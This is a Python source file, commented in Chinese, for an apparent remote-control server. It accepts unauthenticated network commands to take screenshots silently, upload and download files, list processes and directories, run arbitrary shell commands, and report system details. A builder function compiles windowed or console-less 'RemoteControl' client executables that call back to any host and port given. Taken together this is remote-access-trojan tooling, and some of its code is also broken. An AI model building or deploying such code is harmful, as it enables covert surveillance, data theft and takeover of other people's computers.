import socket
import threading
import json
import os
import mss
import base64
from PIL import Image
import io
import paramiko
import platform
import subprocess
import psutil
import sys
from PIL import ImageGrab
import tempfile
import shutil
import re
import logging
from datetime import datetime

# 配置日志
def setup_logger(name):
    # 获取程序根目录
    if getattr(sys, 'frozen', False):
        # 如果是打包后的可执行文件
        root_dir = os.path.dirname(sys.executable)
    else:
        # 如果是直接运行的 Python 脚本
        root_dir = os.path.dirname(os.path.abspath(__file__))
    
    # 创建日志目录
    log_dir = os.path.join(root_dir, 'log')
    os.makedirs(log_dir, exist_ok=True)
    
    # 创建日志文件名（包含时间戳）
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = os.path.join(log_dir, f'{name}_{timestamp}.log')
    
    # 配置日志记录器
    logger = logging.getLogger(name)
    
    # 如果已经有处理器，先清除
    if logger.handlers:
        for handler in logger.handlers[:]:
            logger.removeHandler(handler)
    
    logger.setLevel(logging.DEBUG)
    
    # 创建文件处理器
    file_handler = logging.FileHandler(log_file, encoding='utf-8')
    file_handler.setLevel(logging.DEBUG)
    
    # 创建控制台处理器
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.DEBUG)
    
    # 创建格式化器
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    
    # 添加处理器到日志记录器
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    # 记录日志文件路径
    logger.info(f"日志文件创建: {log_file}")
    
    return logger

# 创建服务器日志记录器
logger = setup_logger('server')

# 服务器配置
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5001

class RemoteServer:
    def __init__(self):
        self.server_socket = None
        self.clients = []
        logger.info("服务器初始化开始")
        self.init_server()
        logger.info("服务器初始化完成")

    def init_server(self):
        self.screen_capture = mss.mss()
        self.is_windows = platform.system() == 'Windows'
        self.templates_dir = os.path.join(os.path.dirname(__file__), 'templates')

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((SERVER_HOST, SERVER_PORT))
            self.server_socket.listen(5)
            logger.info(f"服务器启动成功，正在监听端口 {SERVER_PORT}")
            
            while True:
                client_socket, address = self.server_socket.accept()
                logger.info(f"新客户端连接: {address}")
                self.clients.append(client_socket)
                self.handle_client(client_socket, address)
                
        except Exception as e:
            logger.error(f"服务器运行错误: {str(e)}")
        finally:
            self.stop()

    def stop(self):
        if self.server_socket:
            self.server_socket.close()
        for client in self.clients:
            try:
                client.close()
            except:
                pass
        logger.info("服务器已停止")

    def handle_client(self, client_socket, address):
        try:
            logger.info(f"新客户端连接: {address}")
            while True:
                try:
                    # 接收命令
                    command_data = client_socket.recv(4096).decode('utf-8')
                    if not command_data:
                        break
                    
                    command = json.loads(command_data)
                    logger.debug(f"收到命令: {command}")
                    
                    # 处理不同类型的命令
                    command_type = command.get('type')
                    if command_type == 'generate_control':
                        response = self.handle_generate_control(command.get('data', {}))
                    elif command_type == 'screen_capture':
                        response = self.handle_screen_capture()
                    elif command_type == 'file_upload':
                        response = self.handle_file_upload(command.get('data', {}))
                    elif command_type == 'file_download':
                        response = self.handle_file_download(command.get('path'))
                    elif command_type == 'list_directory':
                        response = self.handle_list_directory(command.get('path'))
                    elif command_type == 'list_processes':
                        response = self.handle_list_processes()
                    elif command_type == 'execute_command':
                        response = self.handle_execute_command(command.get('command'))
                    elif command_type == 'system_info':
                        response = self.handle_system_info()
                    else:
                        response = {
                            'status': 'error',
                            'message': f'未知的命令类型: {command_type}'
                        }
                    
                    # 发送响应
                    try:
                        client_socket.send(json.dumps(response).encode('utf-8'))
                        logger.debug(f"发送响应: {response}")
                    except Exception as e:
                        logger.error(f"发送响应错误: {str(e)}")
                        break
                    
                except json.JSONDecodeError as e:
                    logger.error(f"JSON解析错误: {str(e)}")
                    continue
                except Exception as e:
                    logger.error(f"处理客户端命令时发生错误: {str(e)}")
                    break
                    
        except Exception as e:
            logger.error(f"处理客户端连接时发生错误: {str(e)}")
        finally:
            client_socket.close()
            logger.info("客户端连接已关闭")

    def handle_screen_capture(self):
        try:
            logger.info("开始截图")
            
            # 根据操作系统选择合适的截图方法
            if platform.system() == 'Darwin':  # macOS
                # 使用 screencapture 命令
                with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
                    subprocess.run(['screencapture', '-x', temp_file.name], check=True)
                    with open(temp_file.name, 'rb') as f:
                        image_data = f.read()
                    os.unlink(temp_file.name)
            else:  # Windows 和 Linux
                screenshot = ImageGrab.grab()
                
                # 确保图片是 RGB 模式
                if screenshot.mode in ('RGBA', 'LA'):
                    background = Image.new('RGB', screenshot.size, (255, 255, 255))
                    background.paste(screenshot, mask=screenshot.split()[-1])
                    screenshot = background
                elif screenshot.mode != 'RGB':
                    screenshot = screenshot.convert('RGB')
                
                # 保存为 JPEG 格式
                with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
                    screenshot.save(temp_file.name, 'JPEG', quality=95)
                    with open(temp_file.name, 'rb') as f:
                        image_data = f.read()
                    os.unlink(temp_file.name)
            
            # 编码图片数据
            image_base64 = base64.b64encode(image_data).decode()
            
            logger.info("截图成功")
            return {
                'status': 'success',
                'message': '截图成功',
                'data': image_base64
            }
                
        except Exception as e:
            logger.error(f"截图错误: {str(e)}")
            return {
                'status': 'error',
                'message': f'截图失败: {str(e)}'
            }

    def handle_file_upload(self, client_socket, data):
        try:
            logger.info("开始处理文件上传")
            if not data or 'filename' not in data or 'content' not in data:
                logger.error("无效的文件数据")
                return {
                    'status': 'error',
                    'message': '无效的文件数据'
                }
            
            filename = data['filename']
            content = base64.b64decode(data['content'])
            
            # 保存文件
            with open(filename, 'wb') as f:
                f.write(content)
            
            logger.info(f"文件上传成功: {filename}")
            return {
                'status': 'success',
                'message': '文件上传成功'
            }
        except Exception as e:
            logger.error(f"文件上传错误: {str(e)}")
            return {
                'status': 'error',
                'message': str(e)
            }

    def handle_file_download(self, path):
        try:
            logger.info(f"开始处理文件下载: {path}")
            if not path or not os.path.exists(path):
                logger.error(f"文件不存在: {path}")
                return {
                    'status': 'error',
                    'message': '文件不存在'
                }
            
            with open(path, 'rb') as f:
                content = f.read()
            
            logger.info(f"文件下载成功: {path}")
            return {
                'status': 'success',
                'data': base64.b64encode(content).decode()
            }
        except Exception as e:
            logger.error(f"文件下载错误: {str(e)}")
            return {
                'status': 'error',
                'message': str(e)
            }

    def handle_list_directory(self, path):
        try:
            logger.info(f"开始列出目录: {path}")
            if not path:
                path = os.path.expanduser("~")
            
            if not os.path.exists(path):
                logger.error(f"目录不存在: {path}")
                return {
                    'status': 'error',
                    'message': '目录不存在'
                }
            
            items = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                stat = os.stat(full_path)
                items.append({
                    'name': item,
                    'type': 'directory' if os.path.isdir(full_path) else 'file',
                    'size': stat.st_size,
                    'modified': stat.st_mtime
                })
            
            logger.info(f"目录列表获取成功: {path}")
            return {
                'status': 'success',
                'data': items
            }
        except Exception as e:
            logger.error(f"列出目录错误: {str(e)}")
            return {
                'status': 'error',
                'message': str(e)
            }

    def handle_list_processes(self):
        try:
            logger.info("开始获取进程列表")
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            logger.info("进程列表获取成功")
            return {
                'status': 'success',
                'data': processes
            }
        except Exception as e:
            logger.error(f"获取进程列表错误: {str(e)}")
            return {
                'status': 'error',
                'message': str(e)
            }

    def handle_execute_command(self, command):
        try:
            logger.info(f"开始执行命令: {command}")
            if not command:
                logger.error("命令为空")
                return {
                    'status': 'error',
                    'message': '命令不能为空'
                }
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()
            
            logger.info(f"命令执行完成: {command}")
            return {
                'status': 'success',
                'stdout': stdout,
                'stderr': stderr
            }
        except Exception as e:
            logger.error(f"执行命令错误: {str(e)}")
            return {
                'status': 'error',
                'message': str(e)
            }

    def handle_system_info(self):
        try:
            logger.info("开始获取系统信息")
            info = {
                'computer_name': platform.node(),
                'user_name': os.getlogin(),
                'os_version': platform.platform(),
                'system_directory': os.environ.get('SystemRoot', '/'),
                'home_directory': os.path.expanduser("~")
            }
            logger.info("系统信息获取成功")
            return {
                'status': 'success',
                'data': info
            }
        except Exception as e:
            logger.error(f"获取系统信息错误: {str(e)}")
            return {
                'status': 'error',
                'message': str(e)
            }

    def handle_generate_control(self, request_data):
        try:
            logger.info("开始生成控制端程序")
            platform_name = request_data.get('platform')
            host = request_data.get('host')
            port = request_data.get('port')
            features = request_data.get('features', {})
            
            if not all([platform_name, host, port]):
                logger.error("缺少必要的参数")
                return {
                    'status': 'error',
                    'message': '缺少必要的参数'
                }
            
            # 创建临时目录
            temp_dir = tempfile.mkdtemp()
            logger.info(f"创建临时目录: {temp_dir}")
            
            try:
                # 复制模板文件
                platform_dir = os.path.join(self.templates_dir, platform_name.lower())
                if not os.path.exists(platform_dir):
                    logger.error(f"不支持的平台: {platform_name}")
                    return {
                        'status': 'error',
                        'message': f'不支持的平台: {platform_name}'
                    }
                
                # 复制主程序文件
                control_file = os.path.join(platform_dir, 'control.py')
                if not os.path.exists(control_file):
                    logger.error(f"找不到控制端程序模板: {control_file}")
                    return {
                        'status': 'error',
                        'message': f'找不到控制端程序模板: {control_file}'
                    }
                
                shutil.copy2(control_file, os.path.join(temp_dir, 'control.py'))
                logger.info(f"复制控制端程序模板: {control_file}")
                
                # 复制依赖文件
                requirements_file = os.path.join(platform_dir, 'requirements.txt')
                if os.path.exists(requirements_file):
                    shutil.copy2(requirements_file, os.path.join(temp_dir, 'requirements.txt'))
                    logger.info(f"复制依赖文件: {requirements_file}")
                
                # 复制 spec 文件
                spec_file = os.path.join(platform_dir, 'RemoteControl.spec')
                if os.path.exists(spec_file):
                    shutil.copy2(spec_file, os.path.join(temp_dir, 'RemoteControl.spec'))
                    logger.info(f"复制 spec 文件: {spec_file}")
                
                # 修改控制端程序配置
                control_content = ''
                with open(os.path.join(temp_dir, 'control.py'), 'r', encoding='utf-8') as f:
                    control_content = f.read()
                
                # 替换服务器地址和端口
                control_content = control_content.replace('SERVER_HOST = "localhost"', f'SERVER_HOST = "{host}"')
                control_content = control_content.replace('SERVER_PORT = 5001', f'SERVER_PORT = {port}')
                
                # 根据功能选择修改代码
                if not features.get('screen_capture', False):
                    control_content = re.sub(r'def handle_screen_capture.*?return.*?\n', '', control_content, flags=re.DOTALL)
                if not features.get('file_transfer', False):
                    control_content = re.sub(r'def handle_file_upload.*?return.*?\n', '', control_content, flags=re.DOTALL)
                    control_content = re.sub(r'def handle_file_download.*?return.*?\n', '', control_content, flags=re.DOTALL)
                if not features.get('process_control', False):
                    control_content = re.sub(r'def handle_list_processes.*?return.*?\n', '', control_content, flags=re.DOTALL)
                if not features.get('command_execution', False):
                    control_content = re.sub(r'def handle_execute_command.*?return.*?\n', '', control_content, flags=re.DOTALL)
                
                # 保存修改后的控制端程序
                with open(os.path.join(temp_dir, 'control.py'), 'w', encoding='utf-8') as f:
                    f.write(control_content)
                
                # 使用 PyInstaller 打包
                if platform_name.lower() == 'windows':
                    exe_name = 'RemoteControl.exe'
                elif platform_name.lower() == 'macos':
                    exe_name = 'RemoteControl.app'
                elif platform_name.lower() == 'linux':
                    exe_name = 'RemoteControl'
                else:
                    logger.error(f"不支持的平台: {platform_name}")
                    return {
                        'status': 'error',
                        'message': f'不支持的平台: {platform_name}'
                    }
                
                # 构建 PyInstaller 命令
                pyinstaller_cmd = [
                    'pyinstaller',
                    '--clean',
                    '--noconfirm',
                    '--onefile',
                    '--windowed' if platform_name.lower() != 'linux' else '--noconsole',
                    '--name', 'RemoteControl',
                    'control.py'
                ]
                
                # 如果存在requirements.txt，添加到打包命令中
                if os.path.exists(os.path.join(temp_dir, 'requirements.txt')):
                    pyinstaller_cmd.extend(['--add-data', f'{os.path.join(temp_dir, "requirements.txt")}:.'])
                
                # 执行打包命令
                logger.info(f"开始打包控制端程序: {' '.join(pyinstaller_cmd)}")
                result = subprocess.run(pyinstaller_cmd, cwd=temp_dir, capture_output=True, text=True)
                
                if result.returncode != 0:
                    logger.error(f"打包失败: {result.stderr}")
                    return {
                        'status': 'error',
                        'message': f'打包失败: {result.stderr}'
                    }
                
                logger.info("控制端程序打包完成")
                
                # 读取生成的可执行文件
                exe_path = os.path.join(temp_dir, 'dist', exe_name)
                if not os.path.exists(exe_path):
                    logger.error(f"可执行文件不存在: {exe_path}")
                    return {
                        'status': 'error',
                        'message': '生成可执行文件失败'
                    }
                
                # 如果是macOS应用程序包，需要打包成zip
                if platform_name.lower() == 'macos':
                    zip_path = os.path.join(temp_dir, 'dist', 'RemoteControl.zip')
                    shutil.make_archive(os.path.splitext(zip_path)[0], 'zip', exe_path)
                    with open(zip_path, 'rb') as f:
                        exe_content = f.read()
                else:
                    with open(exe_path, 'rb') as f:
                        exe_content = f.read()
                
                logger.info("控制端程序生成成功")
                return {
                    'status': 'success',
                    'message': '控制端程序生成成功',
                    'data': base64.b64encode(exe_content).decode()
                }
                
            except Exception as e:
                logger.error(f"生成控制端程序失败: {str(e)}")
                return {
                    'status': 'error',
                    'message': f'生成控制端程序失败: {str(e)}'
                }
            finally:
                # 清理临时文件
                if os.path.exists(temp_dir):
                    try:
                        shutil.rmtree(temp_dir)
                        logger.info("临时文件清理完成")
                    except Exception as e:
                        logger.error(f"清理临时文件失败: {str(e)}")
                
        except Exception as e:
            logger.error(f"处理生成控制端请求失败: {str(e)}")
            return {
                'status': 'error',
                'message': f'处理生成控制端请求失败: {str(e)}'
            }

def main():
    try:
        server = RemoteServer()
        server.start()
    except KeyboardInterrupt:
        logger.info("服务器被用户中断")
    except Exception as e:
        logger.error(f"服务器运行错误: {str(e)}")
    finally:
        server.stop()

if __name__ == '__main__':
    main() 